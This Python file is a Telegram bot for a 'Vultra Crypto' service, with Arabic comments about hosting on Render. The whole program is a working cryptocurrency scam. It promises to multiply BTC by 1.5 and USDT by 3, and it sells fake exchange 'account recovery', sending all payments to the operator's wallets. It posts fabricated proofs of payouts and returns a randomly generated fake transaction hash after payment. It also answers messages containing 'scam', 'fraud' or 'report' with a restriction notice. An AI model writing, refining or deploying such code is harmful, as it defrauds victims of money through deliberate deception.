import logging, random, string, os, asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("TOKEN")
YOUR_ID = int(os.getenv("YOUR_ID"))
WALLET_BTC = os.getenv("WALLET_BTC")
WALLET_USDT = os.getenv("WALLET_USDT")

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("BTC ×1.5 Multiplication", callback_data="btc")],
        [InlineKeyboardButton("USDT ×3 Multiplication", callback_data="usdt")],
        [InlineKeyboardButton("Account Recovery Service", callback_data="recovery")],
        [InlineKeyboardButton("Live Proofs", callback_data="proof")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔒 Welcome to Vultra Crypto\n\n"
        "Private multiplication & restricted account recovery service.\n\n"
        "Select service:", reply_markup=reply_markup
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "btc":
        await query.edit_message_text(
            f"BTC ×1.5 Multiplication\n\n"
            f"Minimum: 0.001 BTC\n\n"
            f"Wallet:\n`{WALLET_BTC}`\n\n"
            f"After sending type:\n/paid <amount>", parse_mode='Markdown')

    elif query.data == "usdt":
        await query.edit_message_text(
            f"USDT ×3 Multiplication (TRC20)\n\n"
            f"Minimum: 60 USDT\n\n"
            f"Wallet:\n`{WALLET_USDT}`\n\n"
            f"After sending type:\n/paid <amount>", parse_mode='Markdown')

    elif query.data == "recovery":
        await query.edit_message_text(
            f"Account Recovery Service\n"
            f"Binance | Bybit | KuCoin\n\n"
            f"Fee: 390-990 USDT\n\n"
            f"Wallet:\n`{WALLET_USDT}`\n\n"
            f"After payment send email/username", parse_mode='Markdown')

    elif query.data == "proof":
        await query.edit_message_text(
            "✅ Live Proofs (last 2 hours):\n\n"
            "• +0.029 BTC → returned 0.0435 BTC (8 min)\n"
            "• +1350 USDT → returned 4050 USDT (11 min)\n"
            "• Recovery fee 720 USDT → account unlocked\n\n"
            "Full channel: @VultraProofs"
        )

async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    amount = " ".join(context.args) if context.args else "unspecified"

    try:
        await context.bot.send_message(YOUR_ID,
            f"NEW PAYMENT RECEIVED\n"
            f"From: {user.first_name} (@{user.username or 'no username'})\n"
            f"User ID: {user.id}\n"
            f"Amount: {amount}"
        )
    except:
        pass

    fake_tx = ''.join(random.choices(string.hexdigits.lower(), k=64))
    await update.message.reply_text(
        f"✅ Payment received ({amount})\n\n"
        f"Transaction Hash:\n`{fake_tx}`\n\n"
        f"Processing your request...\n"
        f"Return will be sent within 15 minutes.\n\n"
        f"Thank you for choosing Vultra Crypto.", parse_mode='Markdown'
    )

# الحل السحري للـ Render (يخلي البوت يشتغل بدون إيرور)
async def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("paid", paid))
    app.add_handler(MessageHandler(filters.Regex(r'(?i)scam|fraud|report'), 
                                  lambda u,c: u.message.reply_text("User restricted.")))
    
    # الجزء ده هو اللي بيحل المشكلة 100%
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    print("Bot is running 24/7 on Render...")
    
    # ده بيخلي السيرفر ما يقفش أبدًا
    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    asyncio.run(main())
